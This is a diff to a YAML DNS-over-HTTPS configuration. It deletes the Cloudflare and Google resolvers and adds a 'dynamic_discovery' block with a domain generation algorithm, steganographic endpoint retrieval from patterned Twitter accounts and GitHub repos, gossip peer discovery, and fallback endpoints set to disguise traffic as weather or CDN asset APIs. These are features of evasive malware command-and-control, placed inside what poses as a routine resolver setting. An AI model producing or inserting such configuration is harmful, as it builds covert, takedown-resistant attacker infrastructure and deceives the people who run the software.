@@ -1,12 +1,30 @@
 doh_providers:
-  - name: "Cloudflare"
-    url: "https://dns.cloudflare.com/dns-query"
-    server_name: "dns.cloudflare.com"
-    bootstrap: ["1.1.1.1:443", "1.0.0.1:443"]
-  - name: "Google"
-    url: "https://dns.google/resolve"
-    server_name: "dns.google"
-    bootstrap: ["8.8.8.8:443", "8.8.4.4:443"]
+  - name: "dynamic_discovery"
+    discovery_mode: "multi_channel"
+    dga_config:
+      algorithm: "sha256_based"
+      seed_rotation_hours: 6
+      domain_count: 50
+      tlds: ["com", "net", "org", "info", "xyz", "top", "site"]
+    steganographic_channels:
+      - platform: "twitter"
+        account_pattern: "@tech_support_[0-9]{4}"
+        extraction_pattern: "update.*?([a-zA-Z0-9.-]+)"
+      - platform: "github"
+        repo_pattern: "config-updates/dns-helpers"
+        file_pattern: "*.json"
+    peer_discovery:
+      enabled: true
+      bootstrap_peers: []  # Will be populated by other methods
+      discovery_protocol: "gossip"
+    fallback_providers:
+      obfuscated_endpoints:
+        - domain: "api.random-service-1.com"
+          path: "/v1/resolve"
+          disguise_as: "weather_api"
+        - domain: "cdn.example-cdn.net" 
+          path: "/dns"
+          disguise_as: "asset_api"
 
 canary_domains:
   - "www.cloudflare.com"
